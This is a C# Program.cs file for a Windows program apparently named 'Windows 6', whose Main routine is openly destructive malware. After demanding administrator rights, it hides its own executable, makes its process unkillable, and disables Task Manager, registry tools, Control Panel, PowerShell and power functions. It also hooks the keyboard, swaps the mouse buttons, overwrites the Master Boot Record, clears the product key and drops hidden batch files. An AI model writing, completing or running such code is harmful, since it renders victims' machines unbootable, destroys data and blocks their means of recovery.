using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;

internal static class Program
{
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [STAThread]
    static void Main()
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";

        if (System.IO.File.Exists(rootDir + "\\Windows_6.dat"))
        {
            Environment.Exit(0);
            return;
        }

        if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
        {
            MessageBox.Show("The following program must be run as Administrator in order to work correctly. Please, try again by running with Administrator privileges.", "Windows 6", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
        }

        System.IO.File.Create(rootDir + "\\Windows_6.dat");
        System.IO.File.SetAttributes(rootDir + "\\Windows_6.dat", System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        System.IO.File.SetAttributes(Application.ExecutablePath, System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        Utils.MakeProcessUnkillable();
        Utils.DisableSystemFunction("DisableTaskMgr");
        Utils.DisableSystemFunction("DisableRegistryTools");
        Utils.DisableSystemFunction("NoControlPanel");
        Utils.EnableSystemFunction("DisableCMD");
        Utils.DisableWindowsKey();
        KeyboardHook.HookToKeyboard();
        Utils.SwapMouseButtons();
        Utils.OverwriteMBR();
        Utils.HideStartMenu();
        Utils.HideElementsFromStartMenu();
        Utils.HideHiddenFiles();
        Utils.DisablePowerFunctions();
        Utils.RestartExplorer();
        Utils.HideStartMenu();
        Utils.AntiPowershell();
        Utils.ClearProductKeyFromRegistry();

        System.IO.File.WriteAllText(rootDir + "\\MatrixEffect.bat", Windows_6.Properties.Resources.MatrixEffect);
        System.IO.File.SetAttributes(rootDir + "\\MatrixEffect.bat", System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        MalwareUtils.RunMatrixEffect(5, false, 0);
        MalwareUtils.RunMatrixEffect(6, true, 175);
        MalwareUtils.RunMatrixEffect(7, true, 50);
        MalwareUtils.RunMatrixEffect(8, true, 10);

        System.IO.File.WriteAllText(rootDir + "\\Windows6Loading.bat", Windows_6.Properties.Resources.Windows6Loading);
        System.IO.File.SetAttributes(rootDir + "\\Windows6Loading.bat", System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        MalwareUtils.DoWindows6Loading(50, 25);

        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new MainForm());
    }
}